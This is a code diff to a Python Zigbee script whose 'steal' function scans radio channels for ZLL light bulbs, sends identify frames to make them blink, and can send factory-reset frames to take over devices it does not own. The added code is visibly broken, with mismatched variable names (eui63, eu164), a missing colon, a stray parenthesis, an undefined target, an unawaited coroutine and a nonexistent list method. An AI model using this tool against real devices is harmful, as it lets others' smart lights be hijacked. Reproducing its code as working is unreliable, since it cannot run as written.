@@ -26,19 +26,15 @@ class Prompt:
 
 async def prepare_config(device_path, baudrate):
     dev = await util.setup(device_path, baudrate)
-    eui63 = await getattr(dev, 'getEui64')()
-    eui63 = bellows.types.named.EmberEUI64(*eui64)
+    eui64 = await getattr(dev, 'getEui64')()
+    eui64 = bellows.types.named.EmberEUI64(*eui64)
 
     res = await dev.mfglibStart(True)
-    util.check(res[-1], "Unable to start mfglib")
-   return eu63
+    util.check(res[0], "Unable to start mfglib")
+    return (dev, eui63)
+
 async def steal(device_path, baudrate, scan_channel):
-    dev = await util.setup(device_path, baudrate)
-    eui63 = await getattr(dev, 'getEui64')()
-    eui63 = bellows.types.named.EmberEUI64(*eui64)
-
-    res = await dev.mfglibStart(True)
-    util.check(res[-1], "Unable to start mfglib")
+    dev, eui64 = await prepare_config(device_path, baudrate)
 
     DLT_IEEE802_15_4 = 195
     pcap = pure_pcapy.Dumper("log.pcap", 128, DLT_IEEE802_15_4)
@@ -47,6 +43,9 @@ async def steal(device_path, baudrate, scan_channel):
     transactions_received = []
     valid_responses = []
     invalid_responses = []
+
+    channel_list = [scan_channel] if scan_channel else list(range(11, 27)).reversed()
+    channel = None
 
 
     def dump_pcap(frame):
@@ -87,7 +86,7 @@ async def steal(device_path, baudrate, scan_channel):
             print(f"{resp.transactionId} != {transaction_id}, this isn't a response to us.\nResponse:{resp}")
             return
 
-        targets.add(resp.extSrc)
+        targets.add((resp.extSrc, transaction_id, channel))
         frame = interpanZll.AckFrame(seq = resp.seq).serialize()
         dump_pcap(frame)
         asyncio.create_task(dev.mfglibSendPacket(frame))
@@ -95,7 +94,8 @@ async def steal(device_path, baudrate, scan_channel):
     cbid = dev.add_callback(handle_incoming)
 
 
-    for channel in ([scan_channel] if scan_channel else range(11, 27)):
+    while channel_list:
+        channel = channel_list.pop()
         print("Scanning on channel",channel)
         res = await dev.mfglibSetChannel(channel)
         util.check(res[0], "Unable to set channel")
@@ -124,35 +124,7 @@ async def steal(device_path, baudrate, scan_channel):
             print(f"Found no targets on {channel}")
 
         while len(targets)>0:
-            target = targets.pop()
-            print(f"Sending flashing identifier packet to {target}")
-
-            frame = interpanZll.IdentifyReq(
-                seq = 2,
-                srcPan = 0,
-                extSrc = eui64,
-                transactionId = transaction_id,
-                extDst = target,
-                frameControl = 0xCC21,
-            ).serialize()
-            dump_pcap(frame)
-            await dev.mfglibSendPacket(frame)
-            #answer = await prompt("Do you want to factory reset the light that just blinked? [y|n] ")
-            answer = "n"
-
-            if answer.strip().lower() == "y":
-                print("Factory resetting "+str(target))
-                frame = interpanZll.FactoryResetReq(
-                    seq = 3,
-                    srcPan = 0,
-                    extSrc = eui64,
-                    transactionId = transaction_id,
-                    extDst = target,
-                    frameControl = 0xCC21,
-                ).serialize()
-                dump_pcap(frame)
-                await dev.mfglibSendPacket(frame)
-                await asyncio.sleep(1)
+            handle_targets(dev, eui64, targets)
 
     print(f"Sent: {sorted(transactions_sent)}")
     print(f"Received: {sorted(transactions_received)}")
@@ -174,6 +146,58 @@ async def steal(device_path, baudrate, scan_channel):
             json.dump(invalid_responses, fp)
     except Exception as exc:
         print(f"Unable to write errors: {exc}")
+
+async def identify_bulb(dev, eui64, target, transaction_id, channel):
+    print(f"Sending flashing identifier packet to {target}")
+    res = await dev.mfglibSetChannel(channel)
+    util.check(res[0], "Unable to set channel")
+
+    frame = interpanZll.IdentifyReq(
+        seq = 2,
+        srcPan = 0,
+        extSrc = eui64,
+        transactionId = transaction_id,
+        extDst = target,
+        frameControl = 0xCC21,
+    ).serialize()
+    dump_pcap(frame)
+    await dev.mfglibSendPacket(frame)
+
+async def send_reset(dev, eui64, transaction_id, channel)
+    res = await dev.mfglibSetChannel(channel)
+    util.check(res[0], "Unable to set channel")
+
+    print(f"Factory resetting {target}"))
+    frame = interpanZll.FactoryResetReq(
+        seq = 3,
+        srcPan = 0,
+        extSrc = eui64,
+        transactionId = transaction_id,
+        extDst = target,
+        frameControl = 0xCC21,
+    ).serialize()
+    dump_pcap(frame)
+    await dev.mfglibSendPacket(frame)
+    await asyncio.sleep(1)
+
+async def handle_targets(dev, eu164, targets):
+    #prompt = Prompt()
+    handled = set()
+    while targets:
+        (target, transaction_id, channel) = targets.pop()
+        if target in handled:
+            # This has already been handled on another channel
+            continue
+        else:
+            handled.add(target)
+
+        await identify_bulb(dev, eui64, target, transaction_id, channel)
+
+        #answer = await prompt("Do you want to factory reset the light that just blinked? [y|n] ")
+        answer = "n"
+
+        if answer.strip().lower() == "y":
+            await send_reset(dev, eui64, transaction_id, channel)
 
 
 if __name__ == "__main__":
